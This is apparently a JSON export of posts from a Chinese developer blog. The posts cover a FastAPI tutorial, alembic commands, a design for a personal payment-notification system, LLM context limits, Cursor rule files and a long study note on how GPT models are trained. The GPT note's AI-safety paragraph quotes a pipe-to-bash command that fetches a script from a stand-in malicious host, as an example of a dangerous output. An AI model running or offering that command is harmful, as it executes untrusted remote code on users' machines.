[{"title":"FastAPI中文教程（一）","url":"/posts/180.html","content":"FastAPI系列教程（一）教程资源ChristopherGS的英文教程\npyb4430/full-stack-fastapi-postgresql: Full stack, modern web application generator. Using FastAPI, PostgreSQL as database, Docker, automatic HTTPS and more. (github.com)\n\n上面的教程是根据FastAPI全栈生成的项目模板进行讲解的，对于有一定基础、熟悉容器化技术、熟悉部署细节的同学，可以快速的掌握FastAPI的用法，进行生产项目的开发。\n[pyb4430/full-stack-fastapi-postgresql]仓库是fork的官方并进行积极维护的一个仓库，至该文章编写时间2023/3/12官方仓库对于旧模块失效出现多处bug仍未进行修复，推荐根据该全栈仓库学习全栈部署。\n\n\n官方文档是最好的学习教程，FastAPI作者Tangolo比较忙，经常开坑，FastAPI的文档更新也不是很完善，部分章节内容没有进行更新（例如没有详细讲解依赖注入的异步写法，或者大多代码使用的都是非异步写法，SQLalchemy也没详细讲解异步写法），这部分虽然不是很重要，可以在模块官方和Python进阶教程里面学习到，但是对于初学者就不是很友好，无法系统的学习，会感觉到混乱。\n\n前言至文章编写时间，目前Python Web框架从性能上来讲，FastAPI基于Starlette开发，处于Python Web开发框架的最优选。据调查（根据目前数个Web框架基准测试排行网站），从基准测试来说，FastAPI能达到同时13000并发请求时，同为Python框架的Django、Flask只能达到1k-2k。但是如果要同Golang的GoFrame、Gin、Echo、Iris等框架轻松实现10W+请求数相比，不足为论。如果用Golang，非常推荐GoFrame框架，文档齐全、社区活跃、性能优秀，并且是国人开源并积极维护。\n\n\n注：该调查虽然不严谨，但是有大概的参考价值，Web开发细节复杂，性能高低可根据开发者经验和技术进行优化，但是框架的基准测试则比较稳定。\n\n\nDjango-Ninja框架目前也备受关注，经过试用，确实是能够与普通的django程序比有极大的性能提升。但是考虑到仍然基于django框架开发，数据库对异步的支持不高，社区开源项目不丰富，称不上是一个优秀的选择。\n\n\n\nSwoole框架是由C语言编写的高性能请求框架，单论请求数来说，能够实现同比30w+的并发请求数。但是真正运营于web开发，需要编写路由功能、请求解析、数据校验、数据库交互等，如laravel-swoole也才16000并发请求数。\n所以同学们讨论这个问题不能太片面，像本文重点FastAPI web开发框架是基于Starlette请求框架开发的，Startlette请求框架又是基于Uvicorn异步框架（Python高性能ASGI异步协议库）开发的，尽快其性能再强大，web开发中需要编写路由功能、请求解析、数据校验、数据库交互、安全验证等，最终也会和FastAPI框架差不多，甚至不如。而直接使用FastAPI框架，能够快速开发web网站，其自带Pydantic数据校验（Python数据校验和解析库，备受关注，非常推荐开发自己的项目时使用）等功能，有不少的开源项目和示例，github issue容易查找你开发时遇见的常见问题。\n安装官方项目使用Poetry这个Python环境管理工具，所以官方项目里面是没有requirement.txt文件的，笔者初步尝试，感觉不错，后面讲解一下这个工具的简单使用。官方文档地址有部分中文翻译章节，可以参考。\n首先安装FastAPI模块：\npip install fastapi\n\n还需要安装ASGI服务器，笔者这里使用Uvicorn，官方文档中 Hypercorn也是支持的。\npip install uvicorn[standard] # 最小安装\n\n这样就能编写最简单的FastAPI项目了。\n示例from typing import Unionfrom fastapi import FastAPIapp = FastAPI()@app.get(&quot;/&quot;)def read_root():    return &#123;&quot;Hello&quot;: &quot;World&quot;&#125;@app.get(&quot;/items/&#123;item_id&#125;&quot;)def read_item(item_id: int, q: Union[str, None] = None):    return &#123;&quot;item_id&quot;: item_id, &quot;q&quot;: q&#125;import uvicornuvicorn.run(app)\n\n运行代码可以简单访问并获取响应了，http://127.0.0.1:8000可以获取返回内容。\nAPI文档FastAPI自带API文档，通过路由映射自动生成OpenAPI文件（一种接口协议规格文件），并提供两种UI界面展示，分别是Swagger UI和ReDoc。对于后端API开发来说，能够更加便捷的进行接口调试（一旦尝试过这种体验就回不去了，类似DRF框架），对于前端来说，能够提供一份严格的API文档，方便同步开发（为了接口规范，最好还是开发之前设计好架构，商议确定接口路径和参数，开发中的API总是和结果不一样的）。\n特性校验和解析FastAPI最为突出的还是请求参数的校验和解析，在Python中数据类型是动态的、自动推断的，我们不否认这是一个很好的特性，但是在Web开发中我们需要协调多个模块，通常这些模块是由不同人员或组完成的，开发语言和规范很难统一，尤其在微服务领域里，这些甚至来自不同组织来完成。因为在后端中能够进行严格参数校验和快速解析，这是非常重要的功能（确保参数类型错误，参数不齐这些低级错误不是来源自身，怼人有自信）。这个功能在Springboot、GoFrame、Laravel中都存在，但是在Python传统web框架Django、Flask中却没有，django有名的扩展插件DRF也不过具有参数校验功能，但是却不具备高效的解析和清晰且便捷的文档。\nType Hints——Python PEP 484提案和Pydantic这个库的出现才改变这个局面，加上Pycharm对Type Hints的完美支持（其实对于生成器和旧模块还没很好支持）使得开发效率有进一步的提升。他强大之处只有体验过才能理解，只需要像静态语言一样对属性名添加类型注释，既可以对输入参数校验，对输出参数进行解析。\n没有开发经验的同学可能没法很好理解，例如Json数据结构目前仍是前后端最流行数据结构体，但是Json数据中对浮点数不支持，因此传输过程Python需要将浮点数float转成字符str，再传到前端，从前端接收同样需要由str转float，如果前端传输数据不规范，传过来的整数非字符类型，而是数字类型，类型转换就会出错。又或者是前端传输参数缺少的情况。\n虽然通过繁琐且复杂的校验和解析能够避免这些情况（为了推卸责任，不能不写😘），但是同Pydantic（Cython实现）实现的功能对比，还是不要重复造轮子了，有那时间同学们不想打游戏吗？或者学习？\n在IDE中\n自动补全\n类型检查\n\n数据校验\n在校验失败时自动生成清晰的错误信息\n对多层嵌套的 JSON 对象依然执行校验\n\n转换 来自网络请求的输入数据为 Python 数据类型。包括以下数据\nJSON\n路径参数\n查询参数\nCookies\n请求头\n表单\n文件\n\n转换 输出的数据：转换 Python 数据类型为供网络传输的 JSON 数据\n转换 Python 基础类型 （str、 int、 float、 bool、 list 等）\ndatetime 对象\nUUID 对象\n数据库模型\n……以及更多其他类型\n\n自动生成的交互式 API 文档，包括两种可选的用户界面\nSwagger UI\nReDoc\n\n依赖注入Python是动态语言，轻易修改运行时变量对象，即依赖注入。不同于静态语言预编译程序有严格检查，且编译和运行时处于不同内容，Python则能够轻松修改。FastAPI框架自身提供了依赖注入的方式实现数据库连接获取，身份认证，Session和Cookie解析等中间件功能。这里不推荐传统中间件实现方式的理由是，中间件会在每个请求时都执行，消耗内存高，对于不需要的请求增加多余代码运行，降低效率，而依赖注入可以在需要使用的请求上执行，提供很好的解耦，更加优雅。\n依赖注入的实现原理和代码，笔者会在后面的文章中介绍，此处不做讲解。\n安全性及身份验证集成了安全性和身份认证。杜绝数据库或者数据模型的渗透风险。\nOpenAPI 中定义的安全模式，包括：\n\nHTTP 基本认证。\nOAuth2 (也使用 JWT tokens)。在 OAuth2 with JWT查看教程。\nAPI 密钥，在:\n请求头。\n查询参数。\nCookies, 等等。\n\n\n\n加上来自 Starlette（包括 session cookie）的所有安全特性。\n所有的这些都是可复用的工具和组件，可以轻松与你的系统，数据仓库，关系型以及 NoSQL 数据库等等集成。\n","categories":["Python","fastapi"],"tags":["fastapi","pydantic","Python","SQLAlchemy","Web开发"]},{"title":"Golang题库（十）","url":"/posts/52803.html","content":"","categories":["Golang","面试题"],"tags":["Go","Golang","面试题","编程题"]},{"title":"Logging用法","url":"/posts/56655.html","content":"Logging用法打印所有Logger对象for name in logging.Logger.manager.loggerDict.keys():       logger = logging.getLogger(name)       print(&#x27;name = %s, logger = %s&#x27; % (name, logger))\t\n\n","categories":["Python","logging"],"tags":["Python","log","logging","日志"]},{"title":"Python Django连接WebRTC","url":"/posts/56655.html","content":"Python使用WebRTC异步RTC库aiortc\n","categories":["Python","WebRTC"],"tags":["Python","webrtc","Django","aiortc","实时通信"]},{"title":"alembic教程","url":"/posts/56655.html","content":"alembic教程常用命令数据库升级到最新版本alembic upgrade head\n生成版本文件alembic revision --autogenerate -m &quot;操作注释&quot;\n降级到最初版本base是代表最初版本号，也可以降级指定版本号1234567890\nalembic downgrade base\n查询当前版本号在数据库中有一个alembic_version的字段，表示的是最后一个版本的版本号\nalembic命令和参数解释：1. init：创建一个alembic仓库。2. revision：创建一个新的版本文件。3. --autogenerate：自动将当前模型的修改，生成迁移脚本。4. -m：本次迁移做了哪些修改，用户可以指定这个参数，方便回顾。5. upgrade：将指定版本的迁移文件映射到数据库中，会执行版本文件中的upgrade函数。如果有多个迁移脚本没有被映射到数据库中，那么会执行多个迁移脚本。6. [head]：代表最新的迁移脚本的版本号。7. downgrade：会执行指定版本的迁移文件中的downgrade函数。8. heads：展示head指向的脚本文件版本号。9. history：列出所有的迁移版本及其信息。10. current：展示当前数据库中的版本号。\n\n","categories":["Python"],"tags":["Python","SQLAlchemy","alembic","数据库迁移"]},{"title":"个人免签方案","url":"/posts/33210.html","content":"个人免签方案方案说明介绍个人免签国内主要是解决网银的微信+支付宝支付渠道的对接，这两种方案要进行免签的话，可以通过监听通知消息回写数据库达到转账记录的目的，通过+/-0.1 金额进行多笔订单同时转账场景下确保订单一致性。比较符合的就有 V 免签、码支付、彩虹交易等。其中只有 V 免签有良好的开源生态，因此选用 V 免签进行定制化。\n方案调研手机监听Android 15 Supported vmq apk\nPC 监听未开源 PC 端\nLinux 虚拟化itchat-uos\n架构设计\nApi: fastapi + python3.12\nSQL DB: Postgres\nCache DB: Redis\nCron: apscheduler\nPython Lint: ruff + mypy\n\n设计问题同时多个订单生成，如何区分不同订单支付的通过订单金额不同，以 0.1 步长形成一个梯度去生成订单，同时对 key (price+商户 ID) 使用一个超时异步锁，设置默认 1 分钟超时时间，以订单生成时间字段形成一个锁，每次查询 uid 下最后一个订单，时间超过 1 分钟才允许创建新订单。确保订单和付款信息一致性，在单支付渠道下增加并发量。\n多个租户之间如何区分订单和监控推送信息待回答\n如何兼容多渠道多收款账号待回答\n","categories":["Python"],"tags":["fastapi","Python","支付接口","免签支付"]},{"title":"AI断片了吗？探秘大模型在超长对话中的理解能力","url":"/posts/25614.html","content":"AI断片了吗？探秘大模型在超长对话中的理解能力我们经常需要跟大模型进行反复、冗长的对话，才能令大模型给到我们一个满意的答复。像在写作、代码补全等长上下文的创作场景，需要不断的修正大模型的回答，对未完成内容进行续写，很容易就超出了目前大模型能够支持的上下文长度。\n断片原因大模型断片是可以追溯的，这里需要讲解一下大模型的前置知识。关于大模型的 token 长度，这边有一篇文章讲如何构建 GPT 模型https://daojianime.github.io/posts/60917.html，阅读这篇文章可以对 token有更深一步的理解。\ntoken简单来说就是我们跟大模型的对话文字在多维空间的一个表达，这里 token是模型训练、推理中使用的tokenizer将文字转换成的向量，token 数量跟文字数量并不是一一对应的，因为在多维空间的表达经常会将一个词作为一个token这种操作。\n在我们理解何为 token 的基础上，我们再看看为什么 token 数有限。\n首先在大模型的训练中，动辄是 TB 级的训练语料，需要用到的算力目前都是 H100、A100 这种昂贵的显卡，其次训练的时间也是一两周起步、甚至到数月一轮。所以在模型训练中设计的 token 数量就有必要做限制了，这样才能在有限的资源下，确保可以产出有效的成果。在超长上下文中，确保语料的质量也是一个难题，通常的对话内容没有那么长的上下文。\n结合上述原因，我们理解了大模型的上下文限制，那么超出限制的上下文怎么样了？答案是截断。\n这又引申出来了一个问题，大模型怎么做截断的？要知道超出限制的上下文模型无法处理了，无脑截断会导致我们的对话崩溃，模型胡言乱语。这里给出答案，其实是截断前面的对话内容，但并非无脑截断。具体怎么截断的，就需要讲到大模型中的 system、human、assistant 标签和截断后处理的策略了，笼统讲就是会渐渐遗忘之前的对话内容。\n修复 AI 断片虽然现在大模型的上下文长度能够达到非常长的一个能力，但是部署资源也是有限的，随着大模型出现截断，作为大模型应用工程师我们需要考虑如何降低对话崩溃的出现。\n目前流行的方案基本上是对前面的 human 和 assistant 上下文做摘要提取，然后再加回上下文记忆中。但是这个处理能力，终究是有上限的，根据具体的场景可以做方案适配，完全由大模型做摘要提取并不是一个很好的做法。举例子，如 FIM 场景，超出上下文限制的代码，可以将与此次 query 无关的文件屏蔽掉，针对相关的文件可以做摘要提取，将与调用链相关的代码作为上下文给到模型做补全，这时候作为一个 ReAct Agent 就可以非常不错的完成代码补全了。\n关注大模型发展方向是推理大模型还是标准大模型？\n","categories":["AI"],"tags":["人工智能"]},{"title":"🧭 Cursor Rules 一页规范","url":"/posts/56342.html","content":"🧭 Cursor Rules 一页规范\n适用于 Cursor 编辑器（.cursor/rules/*.mdc） 目的：让 AI 始终遵循项目约定、编码规范、文档风格。\n\n\n🗂️ 规则类型与层级\n\n\n类型\n位置\n作用范围\n说明\n\n\n\nUser Rules\n设置 → Rules\n全局\n个人偏好、风格、语气\n\n\nProject Rules\n.cursor/rules/\n当前项目\n项目约定、代码规范\n\n\nMemories\n自动生成\n临时\n保存 AI 对项目的学习记忆\n\n\nLegacy (.cursorrules)\n项目根目录\n旧格式\n推荐迁移到 .mdc\n\n\n\n📄 .mdc 文件结构---description: 指定规则用途（简洁清晰）globs: src/**/*.ts, tests/**/*.tsalwaysApply: false---- 指导内容 / 编码规范 / 示例\n\n字段说明\ndescription：一句话描述规则用途（AI 判断相关性用）\nglobs：匹配文件路径（仅匹配时生效）\nalwaysApply：true = 总是启用；false = 仅匹配时注入\n\n\n⚙️ 规则生效机制\n**注入 (Injection)**：规则文本进入上下文（prompt）\n**激活 (Activation)**：AI 判断规则与任务相关后才真正遵守\n\n\n注入 ≠ 一定生效，规则需被模型“激活”后才有效。\n\n\n🧩 常见规则模式\n\n\n模式\n启用方式\n用途示例\n\n\n\nAlways\nalwaysApply: true\n全局安全规范、命名约定\n\n\nAuto Attached\nglobs 匹配\n模块/目录级规则\n\n\nAgent Requested\ndescription 触发\n特定任务触发（如生成 GraphQL）\n\n\nManual (@rule)\n手动调用\n临时规则、非自动启用\n\n\n\n🪜 嵌套与作用域\n子目录可设局部规则：frontend/.cursor/rules/\n多层目录下的规则会按路径匹配自动注入\n推荐：项目级通用 + 模块级局部\n\n\n✅ 编写最佳实践\n每条规则聚焦一个主题\ndescription 清晰可匹配任务\n合理使用 globs 限定范围\n慎用 alwaysApply，避免上下文膨胀\n正文包含代码示例 / 模板\n纳入 Git 管理，定期更新\n避免规则冲突，保持一致性\n\n\n⚠️ 注意事项\n规则注入不透明，AI 可能忽略冲突或模糊规则\n@docs/... 文件引用不总可靠\n.mdc 内置编辑 UI 有时不稳定，推荐外部编辑器\n上下文过长可能导致截断，影响规则生效\n\n\n🚀 使用流程\n创建 .cursor/rules/ 目录\n新建 .mdc 文件并填写 description / globs / alwaysApply\n在正文写清楚规则内容\n编辑匹配文件或对话时自动启用\n需要时在对话中使用 @ruleName 显式调用\n\n\n✅ 示例---description: Apply to all service layer filesglobs: src/services/**/*.tsalwaysApply: false---- Service 类以 `*Service` 命名  - 不直接访问数据库  - 必须定义输入/输出类型\n","categories":["AI"],"tags":["人工智能","blog"]},{"title":"GPT学习分享","url":"/posts/60917.html","content":"GPT学习分享序学习Microsoft Build 2023的分享State of GPT。围绕三个内容讲解：\n\nGPT模型\n如何训练一个GPT助手\n如何有效的将这些助手应用到业务上\n\n有限状态马尔可夫链（FSMC）\n本文展示了一个极简 GPT，它只有 2 个 token 0 和 1，上下文长度为 3； 这样的 GPT 可以看做是一个有限状态马尔可夫链（FSMC）。 我们将用 token sequence 111101111011110 作为输入对这个极简 GPT 训练 50 次， 得到的状态转移概率符合我们的预期。\n二进制GPTtoken只有0和1\n输入：0010101\n输出：下一个token是0的概率(P0)和1的概率(P1)\n\n例如输入的是：010，根据自身的参数和状态可能下一个token是1的概率为80%，即\n\nP(0) = 20%\nP(1) = 80%\n\n状态(上下文)和上下文长度上下文：相邻的三个token，用来预测下一个token，这三个token就是一个上下文，即GPT的状态。\n上下文长度：用来预测下一个token的token长度，如上文的3。\n状态空间状态空间即所有可能出现的状态集合。\n\n**vocab_size**：token有多少可能的值。例如上文的0和1。\n**context_length**：上下文长度，例如上文的3。\n\n$$total_states = vocab_sizee^{context_length}$$\n则上午的二进制GPT总的状态数量就是 $2^{3} = 8$​。这也很好理解，所有状态枚举就能出来： {000, 001, 010, 011, 100, 101, 110, 111}。\n真实的状态空间真实的GPT中输入也可是1个token和2个token，这里简化的二进制GPT像上面的有限状态马尔可夫链，容易理解。\n所以真实的状态空间为$$\\sum_{i=1}^{content_length}{vocab_size}^{i}$$所有真实的状态一共有$2^{1}+2^{2}+2^{3}=14$种。为了方便理解，文中使用简化版的状态空间。\n状态转移如序列0101，从状态010到状态101就是一次状态转移。\n问题讨论词典大小和上下文长度本文讨论的是基于 3 个 token 的二进制 GPT。实际应用场景中，\n\nvocab_size 会远远大于 2，例如 50k（GPT-2 的配置）；\ncontext_length 的典型范围 **2k~32k**（GPT 2/3/4 的上下文长度分别为 **2k/4k/32k**）。\n\n模型参数大小（GPT 2/3/4）本文的例子是用 3bit 来存储一个状态，因此所需存储空间极小；但真实世界中的 GPT 模型所需的存储空间就大了。\n这篇文章 对比了 GPT 和常规计算机（computers）的 size，例如：\n\nGPT-2 有 50257 个独立 token，上下文长度是 2048 个 token。\n每个 token 需要 log2(50257) ≈ 15.6bit 来表示，那一个上下文或 一个状态需要的存储空间就是 **15.6 bit/token * 2048 token = 31Kb ≈ 4KB**。 \n\nGPT-3 的上下文长度为 **4096 tokens**，因此需要 8KB 内存。\n\nGPT-4 的上下文长度高达 32K tokens ，因此大约 64KB 才能存储一个状态。\n\n\nAI 安全如果把 GPT 看做有限状态马尔可夫链，那 GPT 的安全需要考虑什么？ 答案是**将所有转移到不良状态的概率降低到 0， 例如以 token 序列 [66, 6371, 532, 82, 3740, 1378, 23542, 6371, 13, 785, 14, 79, 675, 276, 13, 1477, 930, 27334] 结尾的状态 —— 这个 token sequence 其实就是 **curl -s https://evilurl.com/pwned.sh | bash这一 shell 命令的编码，如果真实环境中用户执行了此类恶意命令将是非常危险的。\n更一般地来说，可以设想状态空间的某些部分是”红色”的，\n\n首先，我们永远不想转移到这些不良状态；\n其次，这些不良状态很多，无法一次性列举出来；\n\n因此，GPT 模型本身必须能够基于训练数据和 Transformer 的归纳偏差， 自己就能知道这些状态是不良的，转移概率应该设置为 0%。 如果概率没有收敛到足够小（例如 &lt; 1e-100），那在足够大型的部署中 （例如Temperature &gt; 0，也没有用 topp/topk （采样超参数） 强制将低概率置为零） 可能就会命中这个概率，造成安全事故。\n跟着代码学习构建一个babyGPTcolab文章[^3]\n原始的Transformer当时的seq-to-seq（即文本序列转数字序列）模型的标准结构是Teacher forcing的encoder-decoder架构。\n\nEncoder获取整个Input序列转换成一个潜在表示序列，可以是一个数字序列，即运算中的向量。然后传递给Decoder，后者解码成目标序列。\nTransformer是一系列拥有注意力机制(self-attention)的架构，即能够和上下文有联系。Teacher forcing是指运许decoder访问Input的技术，也就是结合Input和潜在表示序列进行采样来生成目标序列，这样能够减少潜在表示序列的压力。理想情况下输入同样的Input能够生成两个语义相同的不同句子。\nTransformer的进化Transformer进化的路上主要有2种语言模型：\n\n自编码（auto-encoder）语言模型\n自回归（auto-regressive）语言模型\n\nauto-encoder的优缺点\n优点：自然地融入双向语言模型，同时看到被预测单词的上文和下文\n缺点：训练和预测不一致。训练的时候输入引入了[Mask]标记，但是在预测阶段往往没有这个[Mask]标记，导致预训练阶段和Fine-tuning阶段不一致。\n\nauto-regressive的优缺点\n优点：对于生成类的NLP任务，比如文本摘要，机器翻译等，从左向右的生成内容，天然和自回归语言模型契合。\n缺点：由于一般是从左到右（当然也可能从右到左），所以只能利用上文或者下文的信息，不能同时利用上文和下文的信息。\n\n变化原始的Transformer模型很适合机器翻译，因为机器翻译正是一个文本序列转换成另一个文本序列（seq-to-seq）的过程。\n在解决一些实际任务的时候，并不需要完整的encoder和decoder结构，经过使用单一结构和堆的尽可能高的层数，然后使用大量语料训练，出现了两个突出的模型，即BERT和GPT-2。\n\n\n\nBERT和GPT训练都使用了Masked Self-Attention的方式。BERT在训练中通过对随机单词进行Mask，然后推测Mask的单词；GPT则是通过屏蔽下文的单词进行训练，通过输入的序列预测下一个可能出现的单词。在训练数据上两者也有区别，BERT在大量的英文数据和维基百科中进行训练，语料多但是没有经过筛选，GPT则是寻找在Reddit社交媒体、维基百科和英文书籍上的优质文章进行训练。\n参数量：\n\nBERT：340M\nGPT-2：1.5B\n\n\n训练AI助手引言训练大模型助手主要分成四个阶段：\n\n预训练（pre-training）\n监督微调（supervised fine tuning, SFT）\n奖励建模（reward modeling）\n强化学习（reinforcement learning）\n\n每个阶段又分成三个部分，数据集、算法训练、模型输出。\n\n预训练这个阶段占据了绝大多数的时间和算力，占据比例超过90%，\n数据集首先需要收集大量的数据。例如，下面是 Meta 训练 LLaMA 所用的数据集，\n\n\n\n占比\n数据集\n迭代次数（Epochs）\n数据集大小（Disk size）\n\n\n\n67.0%\nCommonCrawl\n1.10\n3.3 TB\n\n\n15.0%\nC4\n1.06\n783 GB\n\n\n4.5%\nGithub\n0.64\n328 GB\n\n\n4.5%\nWikipedia\n2.45\n83 GB\n\n\n4.5%\nBooks\n2.23\n85 GB\n\n\n2.5%\nArXiv\n1.06\n92 GB\n\n\n2.0%\nStackExchange\n1.03\n78 GB\n\n\n表 1：LLaMA 预训练数据。其中 epochs 是用 1.4T tokens 预训练时的迭代次数。用 1T tokens 预训练时也是用的这个数据集比例。\n可以大致看到这些数据集的类型。它们混合在一起，然后根据比例进行采样，得到 GPT 神经网络的训练集。\n文本token化在实际训练这些数据之前，需要经过一个预处理步骤，即 token 化。\n\n将原始文本翻译成整数序列，后者是 GPT 的表示方式。\n一个 token 可能是一个单词、一个词根、标点、标点+单词等等；\n每个 token 平均对应 0.75 个单词；\n所有的独立 token 组成一个词典（词汇表），典型的词典大小：10k~100k tokens；\n\n\n这种文本/token 转换是无损的，有很多算法，例如常用的字节对编码。\n\n将数据集的文本进行编码、序列化，得到矢量数据，这样能够更好将自然语言在数学上映射出关联的紧密程度。每个token是语句可拆分的最小单位，例如一个单词、一个符号。\n\n超参数接下来需要考虑控制阶段的超参数。这里拿两个具体模型 GPT-3/LLaMA 作为例子，\n\nGPT-4 的训练信息公开比较少，所以这里使用 GPT-3 的数据，注意 GPT-3 已经是三年前的模型了。\nLLaMA 是 Meta 最近发布的一个开源模型，数据比较新，信息比较全。\n\n在GPT-3和LLaMA中主要关注词汇表大小、上下文长度、参数数量。\n词汇表大小通常为10k个token。\n上下文长度通常为2k/4k，有时甚至100k，这决定了模型在预测阶段中，预测序列下一个token所能看到的最大token数量。\n参数数量一定程度上决定模型的性能，但不是绝对的。例如LLaMA在1.4万亿个token上训练，训练时间更长，相较在0.3万亿个token训练的GPT-3表现效果更好，但是LLaMA的最大参数是65B，比GPT-3的175B少了将近2/3。\n\n硬件环境和成本\n\n\n\nGPU\n训练时长\n训练成本\n\n\n\nGPT-3\n约**一万张 V100**\n30 天左右\n$100 万 ~ $1000 万\n\n\nLLaMA\n两千张 A100\n21 天\n$500 万\n\n\n\nV100/A100 算力对比参考。\n\n这些都是在预训练阶段应该考虑的。\n训练过程输入给Transformer的是(B, T)的矩阵，B表示批次大小，T表示上下文长度。每个上下文中序列（即连续完成的单句）末尾要添加标识符，上下文的开头和末尾则不需要添加。\n\n预测下一个token预测下一个token只能使用当前行的前T个token进行预测。下一个token有词汇表数量N种可能性。概率根据输入服从某种分布。\n\n现在看个更真实的训练，《纽约时报》团队在莎士比亚数据集上训练了一个小型 GPT。 下面是一小段莎士比亚文本和训练之后的采样效果：\n\n采样的方式是预测下一个 token，可以看到：\n\n左下角：开始时，GPT 的权重是完全随机的，因此也会得到完全随机的采样输出。\n右边：随着 GPT 训练时间越来越长，会得到越来越一致和连贯的采样输出。\n\n损失函数控制训练的精度和梯度，即训练的效果和速度。\n\n基座模型通过一个月的训练，在通用语料上构建的基座模型，能够针对任意的下游任务进行微调，预测的结果通常语句通顺、语义连贯。\n分类任务针对分类任务进行微调的话，可以：\n\n以前的做法是收集正负样本，训练某种NLP模型。\n现在的做法是忽略情感分类，通过训练大型 Transformer，进行few-shot或zero-shot的文本生成，具有语义理解和泛化能力，进行高效的微调。\n\n提示工程 + 文档补全（GPT-2）\n在 GPT-2 时代，人们注意到比微调更好的方法是给模型以有效的提示。 语言模型功能其实非常单一，它们只想要补全文档（预测下一个 token 的高级形式），换句话说， 如果你想让它们完成其他任务，就要通过某些方式骗一下它们，让它们以为自己在补全文档就行了。——出自[State of GPT译文][1]\n\n\n如下输入：\n问题：风扇有几个扇叶？回答：3问题：摩托车有几个车轮？回答：\n\n可以得到模型生成：\n2\n\n即使GPT-5甚至未来，提示工程都对模型输出有优化作用。这就是few-shot，让它以为自己在补全（模仿）一个文档，而实际上是回答了我们的问题。\n下图可以看到，提示工程在很多问题上非常有效，甚至不需要训练任何神经网络或微调。\n　\n基础模型不是助手基础模型在补充回答之外的效果很差，无法对话和回答问题。通过监督微调（SFT）能够增强模型回答问题的能力，使生成更具有针对性。\n\n监督微调收集高质量数据样本通常是由人工提供数万条像格式是**”提示 + 理想回答”**的高质量文本作为训练数据。\n\nSFT训练同预训练同样的算法和训练过程，但只需要短短几天训练即可，例如：vicuna-13b。能够得到回答问题的模型，而不是只会补充文本的模型，这才是真正的AI助手。\n如果想要更好的效果，还需进一步改进，从人类反馈中学习(RLHF)。\n奖励建模RLHF 包括奖励建模和强化学习。\n奖励建模阶段则是建立一个评审机制，对SFT模型生成文本进行评分，负反馈，从而优化权重。\n建立评审机制在原文中讲述的是利用SFT模型，比较优劣远远简单于文本生成，让SFT模型能够在人工评审的样本中学习，模仿评审，进行类似二元分类的操作，从而对模型生成文本进行比较。\n奖励建模的模型同其他几个阶段不同，该模型只对任务进行评分，不适合单独部署，其他阶段的模型都能单独部署使用。\n奖励现在来看一下如何对奖励进行建模。\n将三次的提示+回答按行排列，\n\n\n蓝色的是提示（prompt tokens），每行都一样；\n黄色的是 SFT 模型基于 prompt 产生的补全（completion tokens），每次都不同；\n绿色的是特殊的 &lt;|reward|&gt; token。\n\n这些数据一起作为新的输入，再训练一个 transforer 模型，\n\n输入：蓝色+黄色 tokens，即原始 prompt + SFT 模型补全\n输出：绿色 token，即奖励（分数）\n\n也就是说，这个模型用”原始问题 + SFT 模型补全结果”来预测”SFT 模型补全结果”的好坏。 换句话说，对每个 SFT 模型的补全质量进行预测。这个预测用数值表示结果的好坏， 我们将这个转化为一个损失函数，并训练我们的模型使得奖励预测与人工给出的 comparison 基准一致。\n这就是训练奖励模型的方法，这使我们能够对补全的结果好坏进行评分。\n特点跟基座模型、SFT 模型以及后面将介绍的强化学习模型相比，奖励模型的最大特点是不能独立部署， 也就是说不能单独部署这样的一个模型，然后接受用户提示（输入），给出有意义的输出（补全）。\n为什么呢？上一节的原理其实已经给出答案了：奖励模型要求的输入是”问题+回答”，它的功能是对其中的”回答”进行评分，判断其好坏。 因此它只是一个完整系统中的模块，而并不是一个可以直接面向用户的模型。\n强化学习RLHF训练通过奖励模型对根据提示生成的每个生成进行评分，高质量生成得到加分，反馈到模型权重中。即RLHF的训练过程。反复训练后得到一个可部署的模型，例如ChatGPT就是RLHF模型。\n参数Temperature 是 NLP 中的一个参数，用于控制生成文本的随机性和创造性。\n\n值越大，生成的结果越多样和不可预测；\n值越小，生成的结果越保守和可预测。\n\nrepetition_penalty设置为大于 1 的数值后，能够避免程序输出太多的重复内容（对重复内容进行生成惩罚）。\nno_repeat_ngram_size设置为某个整数时，模型在生成的时候，会杜绝连续生成相同的或者连续的 n 个重复词组。\nTop_k设置可能出现词的范围，即单次采用token数量，Top_p设置单次累积采用的阈值，越大越好，防止出现重复单词。\n总结根据克伯利大学给出的ELO评分，目前排名前三的都是RLHF模型，其他均是SFT模型，目前效果最好的是GPT-4模型。\n为什么要使用 RLHF？简单回答是：效果好。 下图来自 InstructGPT 论文，其中 PPO 模型就是 RLHF 的。 从人类的反馈来看，质量从高到低依次为：RLHF 模型、SFT 模型、基座模型。\n\n那么，为什么 RLHF 效果这么好呢？社区并没有一个公认的解释， 但这里我可以提供一个可能的原因：比较（comparison）和生成（generation）在计算上的不对称性。\n以生成一个俳句为例。假设让一个模型写一个关于回形针的俳句，\n\n\n如果你是一个承包商，为 SFT 收集数据，那你应该如何为回形针创作一个好的俳句呢？这很难；\n另一方面，但如果给你一些俳句的例子，让你对它们的好坏进行比较（评分），这个就简单多了；\n\n因此，判断比生成要容易的多。这种不对称性使得 comparison 成为一种潜在的更好方式（好落地，实操性强）， 可以利用人的判断力来创建一个更好的模型。\n模型的熵某些情况下，RLHF 模型并不是基础模型的简单改进。特别是，我们注意到 RLHF 模型会丢失一些熵。\n\n这意味着它们会给出更加确定性的结果；相比基础模型，RLHF 模型的输出变化更少；\n基础模型熵比较大，会给出很多不同的输出。\n\n\n在以下情况下，我仍然喜欢使用基础模型：已经有 N 个东西，想生成更多类似的东西时。 例如下图，给出了 7 个 pokeman 名字，想得到更多类似的名字，\n\n后面给出的这些名字看着都是虚构的（没去验证）。我认为这种任务基础模型很擅长， 因为它熵比较大，因此能给出多样的、酷炫的、与之前给出的东西相似的输出。\n引用\nState of GPT\n\nTRANSFORMERS FROM SCRATCH\n\nGPT as a finite-state markov chain\n\n图解GPT\n\n\n","categories":["AI"],"tags":["人工智能","blog","GPT"]},{"title":"Agent多工具超长上下文处理方案","url":"/posts/252.html","content":"方案原理rag方案rag 示例：\n\nhttps://github.com/run-llama/llama_index/blob/df48f1d83b032aae3ec232013a11401cd26ea184/docs/docs/examples/agent/openai_agent_retrieval.ipynb#L223\nhttps://github.com/HRI-EU/tulip_agent/blob/main/examples/tool_library_search.py\nhttps://hri-eu.github.io/tulip_agent/\n\n工具搜索的原理图flowchart TD\n    A[ToolLibrary] --&gt; B[工具管理]\n    A --&gt; C[向量存储]\n    A --&gt; D[嵌入模型]\n\n    B --&gt; E[加载工具]\n    B --&gt; F[搜索工具]\n    B --&gt; G[执行工具]\n    B --&gt; H[更新工具]\n    B --&gt; I[删除工具]\n\n    E --&gt; J[从文件加载]\n    E --&gt; K[从实例加载]\n\n    C 